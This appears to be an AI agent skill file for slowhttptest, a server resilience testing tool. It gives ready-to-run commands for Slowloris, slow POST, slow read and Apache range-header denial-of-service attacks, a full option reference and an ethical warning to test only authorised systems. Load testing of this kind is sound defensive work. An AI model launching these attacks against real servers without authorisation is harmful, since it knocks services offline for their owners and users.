---
name: slowhttptest
description: Simulate application layer Denial of Service (DoS) attacks including Slowloris, Slow HTTP POST, Slow Read, and Apache Range Header attacks. Use when testing web server resilience, validating DoS protections/WAF configurations, or performing vulnerability analysis on web infrastructure.
---

# slowhttptest

## Overview
SlowHTTPTest is a highly configurable tool that simulates low-bandwidth application layer Denial of Service attacks by exhausting server resources (connections, CPU, or memory). It is essential for identifying vulnerabilities to "slow and low" attacks that bypass traditional threshold-based detection. Categories: Vulnerability Analysis / Web Application Testing.

## Installation (if not already installed)
Assume the tool is installed. If not found, use:

```bash
sudo apt install slowhttptest
```

## Common Workflows

### Slowloris (Slow Headers) Attack
Tests if a server is vulnerable to keeping connections open by sending incomplete HTTP headers.
```bash
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://192.168.1.202/index.php -x 24 -p 3
```

### Slow Body (R-U-Dead-Yet) Attack
Tests if a server is vulnerable to slow HTTP POST requests that send body data very slowly.
```bash
slowhttptest -B -u http://example.com/login.php -c 500 -i 10 -r 50 -s 4096 -t POST
```

### Slow Read Attack
Exploits the TCP persist timer by reading responses very slowly, draining the server's connection pool.
```bash
slowhttptest -X -u http://example.com/large-file.zip -c 1000 -r 100 -w 10 -y 20 -n 5 -z 32 -k 3
```

### Apache Range Header Attack
Attempts to cause high memory and CPU usage by requesting multiple overlapping byte ranges.
```bash
slowhttptest -R -u http://example.com/index.html -c 1000 -a 5 -b 2000 -r 100
```

## Complete Command Reference

### Test Modes
| Flag | Description |
|------|-------------|
| `-H` | Slow headers a.k.a. Slowloris (default) |
| `-B` | Slow body a.k.a R-U-Dead-Yet |
| `-R` | Range attack a.k.a Apache killer |
| `-X` | Slow read a.k.a Slow Read |

### Reporting Options
| Flag | Description |
|------|-------------|
| `-g` | Generate statistics with socket state changes (off by default) |
| `-o <file_prefix>` | Save statistics output in `file.html` and `file.csv` (requires `-g`) |
| `-v <level>` | Verbosity level 0-4: 0:Fatal, 1:Info, 2:Error, 3:Warning, 4:Debug |

### General Options
| Flag | Description |
|------|-------------|
| `-c <connections>` | Target number of connections (default: 50) |
| `-i <seconds>` | Interval between followup data in seconds (default: 10) |
| `-l <seconds>` | Target test length in seconds (default: 240) |
| `-r <rate>` | Connections per second (default: 50) |
| `-s <bytes>` | Value of Content-Length header if needed (default: 4096) |
| `-t <verb>` | HTTP verb to use (default: GET for slow headers/read, POST for slow body) |
| `-u <URL>` | Absolute URL of target (default: http://localhost/) |
| `-x <bytes>` | Max length of randomized name/value pair of followup data per tick (default: 32) |
| `-f <content-type>`| Value of Content-type header (default: application/x-www-form-urlencoded) |
| `-m <accept>` | Value of Accept header |

### Probe/Proxy Options
| Flag | Description |
|------|-------------|
| `-d <host:port>` | All traffic directed through HTTP proxy at host:port |
| `-e <host:port>` | Probe traffic directed through HTTP proxy at host:port |
| `-p <seconds>` | Timeout for HTTP response on probe connection before server is marked inaccessible (default: 5) |
| `-j <cookies>` | Value of Cookie header (e.g., -j "user_id=1001; timeout=9000") |

### Range Attack Specific Options
| Flag | Description |
|------|-------------|
| `-a <start>` | Left boundary of range in range header (default: 5) |
| `-b <bytes>` | Limit for range header right boundary values (default: 2000) |

### Slow Read Specific Options
| Flag | Description |
|------|-------------|
| `-k <num>` | Number of times to repeat same request in the connection for persistent connections (default: 1) |
| `-n <seconds>` | Interval between read operations from receive buffer in seconds (default: 1) |
| `-w <bytes>` | Start of the range for advertised window size (default: 1) |
| `-y <bytes>` | End of the range for advertised window size (default: 512) |
| `-z <bytes>` | Bytes to slow read from receive buffer with single `read()` call (default: 5) |

## Notes
- **Ethical Warning**: This tool is designed to crash or significantly degrade web server performance. Only use against systems you own or have explicit permission to test.
- **Detection**: While "slow" attacks use low bandwidth, they are easily detectable by modern WAFs and load balancers if not properly tuned.
- **Probe Connection**: The tool periodically sends a "probe" connection to check if the service is still available; if the probe fails, the tool assumes the DoS was successful.